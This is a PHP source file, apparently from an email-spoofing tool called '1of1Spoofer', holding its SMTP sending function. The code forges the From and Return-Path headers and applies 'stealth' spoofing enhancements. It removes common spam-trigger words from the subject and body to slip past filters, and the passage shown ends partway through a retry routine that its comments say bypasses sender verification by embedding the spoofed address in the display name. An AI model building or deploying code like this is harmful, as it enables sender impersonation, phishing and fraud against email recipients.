<?php
require_once __DIR__ . "/stealth_smtp.php";

/**
 * 1of1Spoofer - SMTP Functions
 * 
 * This file contains functions for SMTP email sending and profile management.
 */

// PHPMailer includes
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception as PHPMailerException;
use PHPMailer\PHPMailer\SMTP;

/**
 * Send an email using SMTP with detailed error handling and attachment support.
 *
 * @param array $emailData The email data to use
 * @param array $smtpSettings The SMTP settings to use
 * @param array $options Additional options
 * @return array Success or error information
 */
function sendWithSmtp($emailData, $attachments = [], $smtpSettings = [], $options = [])
{
    // Create logs directory if it doesn't exist
    $logDir = __DIR__ . '/../logs';
    if (!is_dir($logDir)) {
        mkdir($logDir, 0755, true);
    }

    // Set default options
    $defaultOptions = [
        'include_headers' => false, // Default to not including headers in email body
    ];
    $options = array_merge($defaultOptions, $options);

    $logFile = $logDir . '/smtp.log';
    file_put_contents($logFile, date('Y-m-d H:i:s') . " ===== NEW EMAIL ATTEMPT ===== \n", FILE_APPEND);
    file_put_contents($logFile, date('Y-m-d H:i:s') . " [INFO]: Starting SMTP email send\n", FILE_APPEND);
    file_put_contents($logFile, date('Y-m-d H:i:s') . " [DEBUG]: PHP version: " . phpversion() . "\n", FILE_APPEND);
    file_put_contents($logFile, date('Y-m-d H:i:s') . " [DEBUG]: PHPMailer version: " . PHPMailer::VERSION . "\n", FILE_APPEND);

    // Debug: Log email data and SMTP settings
    file_put_contents($logFile, date('Y-m-d H:i:s') . " [DEBUG]: Email data: " . json_encode($emailData, JSON_PRETTY_PRINT) . "\n", FILE_APPEND);
    file_put_contents($logFile, date('Y-m-d H:i:s') . " [DEBUG]: SMTP settings: " . json_encode($smtpSettings, JSON_PRETTY_PRINT) . "\n", FILE_APPEND);
    file_put_contents($logFile, date('Y-m-d H:i:s') . " [DEBUG]: Options: " . json_encode($options, JSON_PRETTY_PRINT) . "\n", FILE_APPEND);

    // Debug: Log attachments information
    if (!empty($attachments)) {
        if (isset($attachments['name']) && is_array($attachments['name'])) {
            file_put_contents($logFile, date('Y-m-d H:i:s') . " [DEBUG]: Attachments found: " . count($attachments['name']) . "\n", FILE_APPEND);
            foreach ($attachments['name'] as $i => $name) {
                file_put_contents($logFile, date('Y-m-d H:i:s') . " [DEBUG]: Attachment {$i}: {$name}, size: " . ($attachments['size'][$i] ?? 'unknown') . ", type: " . ($attachments['type'][$i] ?? 'unknown') . "\n", FILE_APPEND);
            }
        } else {
            file_put_contents($logFile, date('Y-m-d H:i:s') . " [DEBUG]: Attachments format not recognized\n", FILE_APPEND);
        }
    } else {
        file_put_contents($logFile, date('Y-m-d H:i:s') . " [DEBUG]: No attachments\n", FILE_APPEND);
    }

    try {
        // Create PHPMailer instance
        file_put_contents($logFile, date('Y-m-d H:i:s') . " [INFO]: Creating PHPMailer instance\n", FILE_APPEND);
        $mail = new PHPMailer(true);
        $mail->isSMTP();

        // Set character set for proper handling of special chars
        $mail->CharSet = 'UTF-8';
        $mail->Encoding = 'base64';

        // Critical: Fix for data not accepted errors
        // Reduce the chance of data rejection by simplifying body content
        $mail->XMailer = ' '; // Empty string with space
        $mail->AllowEmpty = true; // Allow empty subjects

        // Configure SMTP settings
        file_put_contents($logFile, date('Y-m-d H:i:s') . " [INFO]: Configuring SMTP settings\n", FILE_APPEND);
        $mail->Host = $smtpSettings['host'];
        $mail->Port = $smtpSettings['port'];

        // Handle TLS/SSL/STARTTLS settings carefully
        if (!empty($smtpSettings['encryption'])) {
            if (strtolower($smtpSettings['encryption']) === 'tls') {
                $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
            } else if (strtolower($smtpSettings['encryption']) === 'ssl') {
                $mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS;
            } else {
                $mail->SMTPSecure = $smtpSettings['encryption'];
            }
        } else {
            $mail->SMTPSecure = '';
            $mail->SMTPAutoTLS = false; // Don't use TLS automatically
        }

        // Add keep-alive for better connection handling
        $mail->SMTPKeepAlive = true;

        // Increased timeouts for reliability
        $mail->Timeout = 60; // 60 seconds timeout
        // Set script execution time if possible
        if (function_exists('set_time_limit')) {
            @set_time_limit(300); // 5 minutes
            file_put_contents($logFile, date('Y-m-d H:i:s') . " [INFO]: Script time limit set to 300 seconds\n", FILE_APPEND);
        }

        file_put_contents($logFile, date('Y-m-d H:i:s') . " [INFO]: Using encryption: " . ($mail->SMTPSecure ?: 'none') . "\n", FILE_APPEND);

        if ($smtpSettings['auth']) {
            file_put_contents($logFile, date('Y-m-d H:i:s') . " [INFO]: SMTP authentication enabled\n", FILE_APPEND);
            $mail->SMTPAuth = true;
            $mail->Username = $smtpSettings['username'];
            $mail->Password = $smtpSettings['password'];
        } else {
            file_put_contents($logFile, date('Y-m-d H:i:s') . " [INFO]: SMTP authentication disabled\n", FILE_APPEND);
            $mail->SMTPAuth = false;
        }

        // For debugging, if needed
        $debugLevel = $smtpSettings['debug_level'] ?? 0;
        $mail->SMTPDebug = $debugLevel;
        if ($debugLevel > 0) {
            file_put_contents($logFile, date('Y-m-d H:i:s') . " [INFO]: SMTP debug level set to {$debugLevel}\n", FILE_APPEND);
            // Capture debug output
            $mail->Debugoutput = function ($str, $level) use ($logFile) {
                file_put_contents($logFile, date('Y-m-d H:i:s') . " [SMTP DEBUG]: {$str}\n", FILE_APPEND);
            };
        }

        // SSL verification
        if (isset($smtpSettings['verify_ssl']) && $smtpSettings['verify_ssl'] === false) {
            file_put_contents($logFile, date('Y-m-d H:i:s') . " [INFO]: SSL verification disabled\n", FILE_APPEND);
            $mail->SMTPOptions = [
                'ssl' => [
                    'verify_peer' => false,
                    'verify_peer_name' => false,
                    'allow_self_signed' => true
                ]
            ];
        }

        file_put_contents($logFile, date('Y-m-d H:i:s') . " [INFO]: Setting email fields\n", FILE_APPEND);

        // From
        $fromName = !empty($emailData['from_name']) ? $emailData['from_name'] : '';
        $mail->setFrom($emailData['from_email'], $fromName);

        // Set only Reply-To header to match the spoofed email
        // Do NOT set an envelope sender that differs from the From address
        // This is critical for spoofing to work properly

        file_put_contents($logFile, date('Y-m-d H:i:s') . " [INFO]: From: {$fromName} <{$emailData['from_email']}>\n", FILE_APPEND);

        // To
        $mail->addAddress($emailData['to']);
        file_put_contents($logFile, date('Y-m-d H:i:s') . " [INFO]: To: {$emailData['to']}\n", FILE_APPEND);

        // Reply-To
        if (!empty($emailData['reply_to'])) {
            // Important: We need to match how real emails format headers exactly
            // Format: "Display Name <email@example.com>"
            $replyToName = !empty($emailData['from_name']) ? $emailData['from_name'] : '';
            $replyToEmail = $emailData['reply_to'];

            // First add the reply-to directly (simpler format)
            $mail->addReplyTo($replyToEmail);
            file_put_contents($logFile, date('Y-m-d H:i:s') . " [INFO]: Added basic Reply-To: {$replyToEmail}\n", FILE_APPEND);

            // Then, as a fallback, clear the header and add a custom header
            // This ensures different email clients handle it properly
            $replyToHeader = '';
            if (!empty($replyToName)) {
                // Need to handle quotes properly
                if (strpos($replyToName, '"') !== false) {
                    // Already has quotes, leave as is
                    $replyToHeader = $replyToName . ' <' . $replyToEmail . '>';
                } else {
                    // Add quotes around the name
                    $replyToHeader = '"' . $replyToName . '" <' . $replyToEmail . '>';
                }
            } else {
                $replyToHeader = $replyToEmail;
            }

            // Use a custom header (some clients prefer this format)
            $mail->addCustomHeader('Reply-To', $replyToHeader);
            file_put_contents($logFile, date('Y-m-d H:i:s') . " [INFO]: Added custom Reply-To header: {$replyToHeader}\n", FILE_APPEND);
        }

        // Add extra headers to improve deliverability
        $mail->addCustomHeader('X-Mailer', 'PHPMailer ' . PHPMailer::VERSION);
        $mail->addCustomHeader('X-Priority', '3');
        $mail->addCustomHeader('X-MSMail-Priority', 'Normal');
        $mail->addCustomHeader('Importance', 'Normal');

        // Set Return-Path to match From for better alignment
        $mail->Sender = $emailData['from_email'];
        file_put_contents($logFile, date('Y-m-d H:i:s') . " [INFO]: Sender/Return-Path: {$emailData['from_email']}\n", FILE_APPEND);

        // Subject - Sanitize to avoid spam triggers
        $subject = $emailData['subject'];

        // Remove common spam trigger patterns from subject
        $subject = str_replace(['!', '$', 'FREE', 'free', 'urgent', 'URGENT', '!!!', '100%'], '', $subject);
        $subject = preg_replace('/\b(free|urgent|important|attention|congratulations|winner|guaranteed|click|offer|instant|cash|money|limited|special|exclusive)\b/i', '', $subject);

        // If subject became empty due to filtering, use a generic one
        $subject = trim($subject);
        if (empty($subject)) {
            $subject = "Information";
        }

        $mail->Subject = $subject;
        file_put_contents($logFile, date('Y-m-d H:i:s') . " [INFO]: Subject: {$subject}\n", FILE_APPEND);

        // CC
        if (!empty($emailData['cc'])) {
            $ccAddresses = explode(',', $emailData['cc']);
            foreach ($ccAddresses as $cc) {
                $cc = trim($cc);
                if (filter_var($cc, FILTER_VALIDATE_EMAIL)) {
                    $mail->addCC($cc);
                    file_put_contents($logFile, date('Y-m-d H:i:s') . " [INFO]: CC: {$cc}\n", FILE_APPEND);
                } else {
                    file_put_contents($logFile, date('Y-m-d H:i:s') . " [WARNING]: Invalid CC address: {$cc}\n", FILE_APPEND);
                }
            }
        }

        // BCC
        if (!empty($emailData['bcc'])) {
            $bccAddresses = explode(',', $emailData['bcc']);
            foreach ($bccAddresses as $bcc) {
                $bcc = trim($bcc);
                if (filter_var($bcc, FILTER_VALIDATE_EMAIL)) {
                    $mail->addBCC($bcc);
                    file_put_contents($logFile, date('Y-m-d H:i:s') . " [INFO]: BCC: {$bcc}\n", FILE_APPEND);
                } else {
                    file_put_contents($logFile, date('Y-m-d H:i:s') . " [WARNING]: Invalid BCC address: {$bcc}\n", FILE_APPEND);
                }
            }
        }

        // Add custom headers for reply threading
        if (!empty($emailData['references'])) {
            // Clean and format the References header, handling multiple references
            $references = $emailData['references'];

            // If it seems to contain multiple IDs (has spaces)
            if (strpos($references, ' ') !== false) {
                // Split by spaces and format each ID individually
                $refArray = explode(' ', $references);
                $formattedRefs = [];

                foreach ($refArray as $ref) {
                    if (!empty(trim($ref))) {
                        $formattedRefs[] = formatMessageId(trim($ref));
                    }
                }

                // Join back with spaces
                $references = implode(' ', $formattedRefs);
            } else {
                // Single reference ID
                $references = formatMessageId($references);
            }

            $mail->addCustomHeader('References', $references);
            file_put_contents($logFile, date('Y-m-d H:i:s') . " [INFO]: Added References header: " . $references . "\n", FILE_APPEND);
        }

        if (!empty($emailData['in_reply_to'])) {
            // Clean and format the In-Reply-To header
            $inReplyTo = formatMessageId($emailData['in_reply_to']);

            $mail->addCustomHeader('In-Reply-To', $inReplyTo);
            file_put_contents($logFile, date('Y-m-d H:i:s') . " [INFO]: Added In-Reply-To header: " . $inReplyTo . "\n", FILE_APPEND);
        }

        // Generate a unique Message-ID
        $domain = explode('@', $emailData['from_email'])[1] ?? 'example.com';
        $messageId = generateMessageId($domain);
        $mail->MessageID = $messageId;
        file_put_contents($logFile, date('Y-m-d H:i:s') . " [INFO]: Generated Message-ID: " . $messageId . "\n", FILE_APPEND);

        // Enhance email deliverability with additional headers
        $mail = enhanceEmailDeliverability($mail, $emailData, $logFile);

        // HTML message
        file_put_contents($logFile, date('Y-m-d H:i:s') . " [INFO]: Setting message content\n", FILE_APPEND);
        $mail->isHTML(true);

        // Mimic real email clients by adding structure to the email
        $currentDate = date('D, j M Y H:i:s O');
        $emailTemplate = <<<HTML
<!DOCTYPE html>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<style type="text/css">
body, p, div, span { font-family: Calibri, Arial, sans-serif; font-size: 9.5pt; color: #000000; }
.header { border-bottom: 1px solid #cccccc; padding-bottom: 10px; margin-bottom: 10px; }
.footer { border-top: 1px solid #cccccc; padding-top: 10px; margin-top: 20px; font-size: 9pt; color: #666666; }
</style>
</head>
<body>
HTML;

        // Add header section only if include_headers is true
        if ($options['include_headers']) {
            $emailTemplate .= <<<HTML
<div class="header">
    <div><strong>From:</strong> {$emailData['from_name']} &lt;{$emailData['from_email']}&gt;</div>
    <div><strong>Sent:</strong> {$currentDate}</div>
    <div><strong>To:</strong> {$emailData['to']}</div>
    <div><strong>Subject:</strong> {$subject}</div>
</div>
HTML;
        }

        $emailTemplate .= <<<HTML
<div class="content">
HTML;

        // Critical: Fix for data not accepted errors and spam filters
        // Sanitize and clean up the message to prevent SMTP issues
        if (isset($emailData['message'])) {
            // Log original length
            $originalLength = strlen($emailData['message']);
            file_put_contents($logFile, date('Y-m-d H:i:s') . " [DEBUG]: Original message length: {$originalLength} bytes\n", FILE_APPEND);

            // Sanitize HTML content
            $htmlBody = $emailData['message'];

            // Process inline base64 images and convert them to embedded images with CIDs
            // This handles images pasted directly into the rich text editor
            $pattern = '/<img[^>]*src="data:image\/(jpeg|jpg|png|gif);base64,([^"]+)"[^>]*>/i';
            if (preg_match_all($pattern, $htmlBody, $matches, PREG_SET_ORDER)) {
                file_put_contents($logFile, date('Y-m-d H:i:s') . " [INFO]: Found " . count($matches) . " embedded base64 images in email\n", FILE_APPEND);

                foreach ($matches as $index => $match) {
                    $imageType = $match[1];
                    $base64Data = $match[2];

                    // Generate a temp file for the image
                    $tempDir = sys_get_temp_dir();
                    $tempFile = tempnam($tempDir, 'img_');

                    // Add correct extension
                    $extension = ($imageType == 'jpg') ? 'jpeg' : $imageType;
                    $tempFileWithExt = $tempFile . '.' . $extension;
                    rename($tempFile, $tempFileWithExt);

                    // Decode and save the image
                    $imageData = base64_decode($base64Data);
                    file_put_contents($tempFileWithExt, $imageData);

                    // Generate a CID
                    $cid = 'inline_' . md5(rand() . time() . $index) . '@' . $domain;

                    // Add as embedded image
                    $mail->addEmbeddedImage(
                        $tempFileWithExt,
                        $cid,
                        'image_' . $index . '.' . $extension,
                        'base64',
                        'image/' . $extension
                    );

                    // Replace in the HTML
                    $newImgTag = '<img src="cid:' . $cid . '"';
                    // Preserve alt, width, height and other attributes
                    if (preg_match('/<img([^>]*)src="data:image\/(jpeg|jpg|png|gif);base64,[^"]+"([^>]*)>/i', $match[0], $attrMatches)) {
                        $beforeSrc = $attrMatches[1] ?? '';
                        $afterSrc = $attrMatches[3] ?? '';
                        $newImgTag = '<img' . $beforeSrc . 'src="cid:' . $cid . '"' . $afterSrc . '>';
                    }

                    $htmlBody = str_replace($match[0], $newImgTag, $htmlBody);
                    file_put_contents($logFile, date('Y-m-d H:i:s') . " [INFO]: Converted inline base64 image #{$index} to embedded image with CID: $cid\n", FILE_APPEND);
                }
            } else {
                file_put_contents($logFile, date('Y-m-d H:i:s') . " [INFO]: No inline base64 images found in the email body\n", FILE_APPEND);
            }

            // Also handle regular image URLs by converting them to use HTTPS
            $htmlBody = preg_replace('/<img([^>]+)src="http:\/\/([^"]+)"([^>]*)>/i', '<img$1src="https://$2"$3>', $htmlBody);
            file_put_contents($logFile, date('Y-m-d H:i:s') . " [INFO]: Converted image URLs to HTTPS where needed\n", FILE_APPEND);

            // Process signature section for image embedding
            if (preg_match('/<div class="signature">(.*?)<\/div>/s', $htmlBody, $signatureMatch)) {
                $signatureContent = $signatureMatch[1];
                file_put_contents($logFile, date('Y-m-d H:i:s') . " [INFO]: Found signature section in the email\n", FILE_APPEND);

                // Look for image tags in the signature that aren't already embedded
                if (preg_match_all('/<img[^>]*src=["\'](?!cid:)([^"\']+)["\'][^>]*>/i', $signatureContent, $sigImgMatches, PREG_SET_ORDER)) {
                    file_put_contents($logFile, date('Y-m-d H:i:s') . " [INFO]: Found " . count($sigImgMatches) . " images in signature to process\n", FILE_APPEND);

                    // Process each signature image
                    foreach ($sigImgMatches as $imgIndex => $imgMatch) {
                        $imgUrl = $imgMatch[1];
                        file_put_contents($logFile, date('Y-m-d H:i:s') . " [INFO]: Processing signature image: " . $imgUrl . "\n", FILE_APPEND);

                        // If it's a remote URL, try to download it
                        if (filter_var($imgUrl, FILTER_VALIDATE_URL)) {
                            try {
                                // Generate a temp file for the image
                                $tempDir = sys_get_temp_dir();
                                $tempFile = tempnam($tempDir, 'sig_img_');
                                $imgData = @file_get_contents($imgUrl);

                                if ($imgData) {
                                    file_put_contents($tempFile, $imgData);

                                    // Determine image type
                                    $imgInfo = getimagesize($tempFile);
                                    if ($imgInfo && isset($imgInfo['mime'])) {
                                        $mimeType = $imgInfo['mime'];
                                        $ext = str_replace('image/', '', $mimeType);

                                        // Generate a CID for the image
                                        $cid = 'sig_img_' . md5($imgUrl . rand(1000, 9999) . time()) . '@' . $domain;

                                        // Add as embedded image
                                        $mail->addEmbeddedImage(
                                            $tempFile,
                                            $cid,
                                            'signature_image_' . $imgIndex . '.' . $ext,
                                            'base64',
                                            $mimeType
                                        );

                                        // Replace in the HTML
                                        $pattern = '/<img([^>]*)src=["\']' . preg_quote($imgUrl, '/') . '["\']([^>]*)>/i';
                                        $replacement = '<img$1src="cid:' . $cid . '"$2>';
                                        $htmlBody = preg_replace($pattern, $replacement, $htmlBody);

                                        file_put_contents($logFile, date('Y-m-d H:i:s') . " [INFO]: Embedded remote signature image with CID: " . $cid . "\n", FILE_APPEND);
                                    } else {
                                        file_put_contents($logFile, date('Y-m-d H:i:s') . " [WARNING]: Could not determine image type for: " . $imgUrl . "\n", FILE_APPEND);
                                    }
                                } else {
                                    file_put_contents($logFile, date('Y-m-d H:i:s') . " [WARNING]: Failed to download image: " . $imgUrl . "\n", FILE_APPEND);
                                }
                            } catch (Exception $e) {
                                file_put_contents($logFile, date('Y-m-d H:i:s') . " [ERROR]: Error processing signature image: " . $e->getMessage() . "\n", FILE_APPEND);
                            }
                        }
                    }
                }
            }

            // Remove potentially problematic content that triggers spam filters
            $htmlBody = preg_replace('/<!--(.*?)-->/s', '', $htmlBody); // Remove HTML comments
            $htmlBody = preg_replace('/<script\b[^>]*>(.*?)<\/script>/is', '', $htmlBody); // Remove scripts
            $htmlBody = preg_replace('/<style\b[^>]*>(.*?)<\/style>/is', '', $htmlBody); // Remove styles
            $htmlBody = preg_replace('/<iframe\b[^>]*>(.*?)<\/iframe>/is', '', $htmlBody); // Remove iframes
            $htmlBody = preg_replace('/<object\b[^>]*>(.*?)<\/object>/is', '', $htmlBody); // Remove objects
            $htmlBody = preg_replace('/<embed\b[^>]*>(.*?)<\/embed>/is', '', $htmlBody); // Remove embeds

            // Remove common spam words and phrases
            $spamWords = [
                'viagra',
                'cialis',
                'rolex',
                'casino',
                'lottery',
                'winner',
                'debt',
                'credit',
                'free offer',
                'free gift',
                'free sample',
                'free trial',
                'free access',
                'incredible deal',
                'act now',
                'limited time',
                'offer expires',
                'urgent',
                'buy now',
                'click here',
                'click below',
                'order now',
                'call now',
                'satisfaction guaranteed',
                'risk free',
                'no risk',
                'this is not spam',
                'not junk mail',
                'not spam',
                'earn money',
                'increase sales',
                'extra income',
                'double your',
                'million dollars',
                'rich',
                'wealthy',
                'no fees',
                'no obligation',
                'no purchase necessary',
                'no experience',
                'no hidden',
                'no catch',
                'no strings attached',
                'all natural',
                'fast cash',
                'pure profit',
                'stock alert',
                'stock pick',
                'additional income',
                'affordable',
                'bargain',
                'best price',
                'big bucks',
                'cash bonus',
                'cents on the dollar',
                'collect',
                'compare rates',
                'compete for your business',
                'direct marketing',
                'direct email',
                'hidden charges',
                'human growth hormone',
                'internet marketing',
                'lose weight',
                'mass email',
                'meet singles',
                'multi-level marketing',
                'no catch',
                'no gimmick',
                'no inventory',
                'no middleman',
                'no questions asked',
                'no selling',
                'no strings attached',
                'not scam',
                'obligation',
                'opportunity',
                'opt in',
                'pre-approved',
                'refinance',
                'removal instructions',
                'remove subject',
                'requires initial investment',
                'social security number',
                'subject to credit',
                'they keep your money',
                'unsecured credit',
                'vacation offers',
                'valium',
                'vicodin',
                'weight loss',
                'xanax',
                'year',
                '!!!',
                '!!',
                '$$'
            ];

            // Case-insensitive replacement of spam words with alternatives
            foreach ($spamWords as $word) {
                $htmlBody = preg_replace('/\b' . preg_quote($word, '/') . '\b/i', 'item', $htmlBody);
            }

            // Normalize line breaks - critical for SMTP
            $htmlBody = str_replace(["\r\n", "\r"], "\n", $htmlBody);

            // Use simplified HTML tags - avoid too many colors, fonts and formatting tags
            $allowedTags = '<p><br><a><b><i><u><strong><em><div><span><table><tr><td><th><h1><h2><h3><h4><li><ul><ol><img>';
            $htmlBody = strip_tags($htmlBody, $allowedTags);

            // Make sure image URLs use https
            $htmlBody = preg_replace('/<img([^>]+)src="http:\/\/([^"]+)"([^>]*)>/i', '<img$1src="https://$2"$3>', $htmlBody);

            // Limit length if too large
            $maxLength = 100000; // 100KB max
            if (strlen($htmlBody) > $maxLength) {
                $htmlBody = substr($htmlBody, 0, $maxLength) . "\n\n... [Additional content available] ...";
                file_put_contents($logFile, date('Y-m-d H:i:s') . " [WARNING]: Message truncated due to size\n", FILE_APPEND);
            }

            // Close the template
            $htmlBody = $emailTemplate . $htmlBody . "\n\n</div>\n\n</body>\n</html>";

            // Set the body
            $mail->Body = $htmlBody;

            // Log new length
            $newLength = strlen($htmlBody);
            file_put_contents($logFile, date('Y-m-d H:i:s') . " [DEBUG]: Processed message length: {$newLength} bytes\n", FILE_APPEND);

            // Create plain text version (much simpler)
            $plainBody = "";

            // Add header info only if include_headers is true
            if ($options['include_headers']) {
                $plainBody .= "From: {$emailData['from_name']} <{$emailData['from_email']}>\r\n";
                $plainBody .= "Sent: {$currentDate}\r\n";
                $plainBody .= "To: {$emailData['to']}\r\n";
                $plainBody .= "Subject: {$subject}\r\n\r\n";
            }

            $plainBody .= strip_tags($emailData['message']) . "\r\n\r\n";

            $mail->AltBody = $plainBody;
            file_put_contents($logFile, date('Y-m-d H:i:s') . " [DEBUG]: Plain text length: " . strlen($plainBody) . " bytes\n", FILE_APPEND);
        } else {
            $mail->Body = "This is a test email."; // Fallback content
            $mail->AltBody = "This is a test email.";
            file_put_contents($logFile, date('Y-m-d H:i:s') . " [WARNING]: No message content provided, using fallback\n", FILE_APPEND);
        }

        // Add attachments if any
        file_put_contents($logFile, date('Y-m-d H:i:s') . " [INFO]: Processing attachments\n", FILE_APPEND);
        if (!empty($attachments) && is_array($attachments)) {
            // Handle array format from $_FILES
            if (isset($attachments['name']) && is_array($attachments['name'])) {
                for ($i = 0; $i < count($attachments['name']); $i++) {
                    $name = $attachments['name'][$i];
                    $tmpName = $attachments['tmp_name'][$i];
                    $error = $attachments['error'][$i];
                    $type = $attachments['type'][$i] ?? '';

                    file_put_contents($logFile, date('Y-m-d H:i:s') . " [INFO]: Processing attachment #{$i}: {$name}\n", FILE_APPEND);

                    if ($error === UPLOAD_ERR_OK && is_uploaded_file($tmpName)) {
                        // Check if this is an image that should be embedded
                        $isImage = strpos($type, 'image/') === 0;
                        $shouldEmbed = isset($_POST['embed_images']) && $_POST['embed_images'] === 'yes';

                        if ($isImage && $shouldEmbed) {
                            // Generate a Content-ID for the image
                            $cid = 'img_' . md5($name . time() . rand(0, 1000)) . '@' . $domain;

                            // Add as embedded image
                            try {
                                $mail->addEmbeddedImage(
                                    $tmpName,
                                    $cid,
                                    $name,
                                    'base64',
                                    $type
                                );

                                // Replace image src in the HTML with the CID
                                $imgPattern = '/<img([^>]*)src=["\']([^"\']*' . preg_quote(basename($name), '/') . ')["\']([^>]*)>/i';
                                $replacement = '<img$1src="cid:' . $cid . '"$3>';
                                $mail->Body = preg_replace($imgPattern, $replacement, $mail->Body);

                                file_put_contents($logFile, date('Y-m-d H:i:s') . " [INFO]: Added embedded image: {$name} with CID: {$cid}\n", FILE_APPEND);
                            } catch (Exception $e) {
                                file_put_contents($logFile, date('Y-m-d H:i:s') . " [ERROR]: Failed to embed image {$name}: " . $e->getMessage() . "\n", FILE_APPEND);

                                // Fall back to regular attachment
                                $mail->addAttachment(
                                    $tmpName,
                                    $name,
                                    'base64',
                                    $type
                                );
                            }
                        } else {
                            // Use a more reliable attachment method
                            try {
                                $mail->addAttachment(
                                    $tmpName,
                                    $name,
                                    'base64',
                                    $type
                                );
                                file_put_contents($logFile, date('Y-m-d H:i:s') . " [INFO]: Added attachment: {$name}, Type: " . $type . ", Size: " . filesize($tmpName) . " bytes\n", FILE_APPEND);
                            } catch (Exception $e) {
                                file_put_contents($logFile, date('Y-m-d H:i:s') . " [ERROR]: Failed to add attachment {$name}: " . $e->getMessage() . "\n", FILE_APPEND);
                            }
                        }
                    } else {
                        file_put_contents($logFile, date('Y-m-d H:i:s') . " [ERROR]: Upload error for attachment #{$i}: {$name}, Error code: {$error}\n", FILE_APPEND);
                    }
                }
            } else {
                file_put_contents($logFile, date('Y-m-d H:i:s') . " [WARNING]: Attachment format not recognized\n", FILE_APPEND);
            }
        }

        // Send the email with extra error handling
        file_put_contents($logFile, date('Y-m-d H:i:s') . " [INFO]: Sending email...\n", FILE_APPEND);

        // Send with fallback options for reliability
        try {
            // Apply stealth enhancements
            if (function_exists("enhanceSpoofedEmail")) {
                $mail = enhanceSpoofedEmail($mail, $emailData["from_email"], !empty($emailData["from_name"]) ? $emailData["from_name"] : "", $logFile);
                file_put_contents($logFile, date("Y-m-d H:i:s") . " [INFO]: Advanced spoofing enhancements applied\n", FILE_APPEND);
            }

            $result = $mail->send();
            return [
                'success' => true,
                'message' => 'Email sent successfully!',
                'message_id' => $messageId
            ];
        } catch (Exception $e) {
            file_put_contents($logFile, date('Y-m-d H:i:s') . " [ERROR]: " . $e->getMessage() . "\n", FILE_APPEND);
            file_put_contents($logFile, date('Y-m-d H:i:s') . " [ERROR]: Exception trace: " . $e->getTraceAsString() . "\n", FILE_APPEND);

            // More specific error for common issues
            $errorMessage = $e->getMessage();

            // Handle specific error cases with more user-friendly messages
            if (strpos($errorMessage, 'limit on the number of allowed outgoing messages was exceeded') !== false) {
                $errorMessage = "SMTP sending limit exceeded. The server has temporarily blocked sending because you've reached your daily email quota. Try these solutions:\n\n";
                $errorMessage .= "1. Wait a few hours before sending more emails\n";
                $errorMessage .= "2. Use a different SMTP server with higher limits\n";
                $errorMessage .= "3. Contact your SMTP provider to increase your sending quota";

                file_put_contents($logFile, date('Y-m-d H:i:s') . " [INFO]: Identified quota limit issue\n", FILE_APPEND);
            } else if (strpos($errorMessage, 'Could not connect to SMTP host') !== false) {
                $suggestions = "Please check:\n";
                $suggestions .= "1. SMTP host name is correct\n";
                $suggestions .= "2. SMTP port is correct (common ports: 25, 465, 587)\n";
                $suggestions .= "3. Firewall is not blocking outgoing connections\n";
                $suggestions .= "4. The SMTP server is running and accessible\n";

                file_put_contents($logFile, date('Y-m-d H:i:s') . " [INFO]: Providing connection troubleshooting suggestions\n", FILE_APPEND);

                $errorMessage = 'Could not connect to SMTP server. ' . $suggestions;
            } elseif (strpos($errorMessage, 'Authentication failed') !== false) {
                $suggestions = "Please check:\n";
                $suggestions .= "1. Username is correct\n";
                $suggestions .= "2. Password is correct\n";
                $suggestions .= "3. SMTP authentication is enabled on the server\n";
                $suggestions .= "4. The account is not locked or restricted\n";

                file_put_contents($logFile, date('Y-m-d H:i:s') . " [INFO]: Providing authentication troubleshooting suggestions\n", FILE_APPEND);

                $errorMessage = 'SMTP authentication failed. ' . $suggestions;
            } elseif (strpos($errorMessage, 'Sender address rejected: not owned by user') !== false) {
                // This specific error occurs when the sender email doesn't match the authenticated user
                file_put_contents($logFile, date('Y-m-d H:i:s') . " [INFO]: Sender address rejected error. Using advanced spoofing technique.\n", FILE_APPEND);

                // Try a different approach to bypass the sender verification
                try {
                    // Create a new PHPMailer instance for the retry
                    $retryMail = new PHPMailer(true);
                    $retryMail->isSMTP();
                    $retryMail->CharSet = 'UTF-8';
                    $retryMail->Encoding = 'base64';
                    $retryMail->XMailer = ' ';
                    $retryMail->AllowEmpty = true;

                    // Configure SMTP settings
                    $retryMail->Host = $smtpSettings['host'];
                    $retryMail->Port = $smtpSettings['port'];

                    // Use the same encryption settings
                    if (!empty($smtpSettings['encryption'])) {
                        if (strtolower($smtpSettings['encryption']) === 'tls') {
                            $retryMail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
                        } else if (strtolower($smtpSettings['encryption']) === 'ssl') {
                            $retryMail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS;
                        } else {
                            $retryMail->SMTPSecure = $smtpSettings['encryption'];
                        }
                    } else {
                        $retryMail->SMTPSecure = '';
                        $retryMail->SMTPAutoTLS = false;
                    }

                    // Authentication
                    $retryMail->SMTPAuth = true;
                    $retryMail->Username = $smtpSettings['username'];
                    $retryMail->Password = $smtpSettings['password'];

                    // Debug level
                    $retryMail->SMTPDebug = $smtpSettings['debug_level'] ?? 0;
                    if ($retryMail->SMTPDebug > 0) {
                        $retryMail->Debugoutput = function ($str, $level) use ($logFile) {
                            file_put_contents($logFile, date('Y-m-d H:i:s') . " [RETRY DEBUG]: {$str}\n", FILE_APPEND);
                        };
                    }

                    // SSL verification
                    if (isset($smtpSettings['verify_ssl']) && $smtpSettings['verify_ssl'] === false) {
                        $retryMail->SMTPOptions = [
                            'ssl' => [
                                'verify_peer' => false,
                                'verify_peer_name' => false,
                                'allow_self_signed' => true
                            ]
                        ];
                    }

                    // Use a compromise approach:
                    // 1. Use the SMTP username as the From address to pass authentication
                    // 2. Set Reply-To header to the spoofed email for replies
                    // 3. Make the display name include both the spoofed name and email
                    $senderEmail = $smtpSettings['username'];

                    // If username is not an email, construct one from the domain
                    if (!filter_var($senderEmail, FILTER_VALIDATE_EMAIL) && strpos($smtpSettings['host'], '.') !== false) {
                        $domain = preg_replace('/^smtp\./', '', $smtpSettings['host']);
                        $senderEmail = $senderEmail . '@' . $domain;
                        file_put_contents($logFile, date('Y-m-d H:i:s') . " [INFO]: Constructed sender email from username and domain: {$senderEmail}\n", FILE_APPEND);
                    }

                    // Create a from name that includes the spoofed email address
                    $spoofedFromName = $emailData['from_name'] . " <" . $emailData['from_email'] . ">";

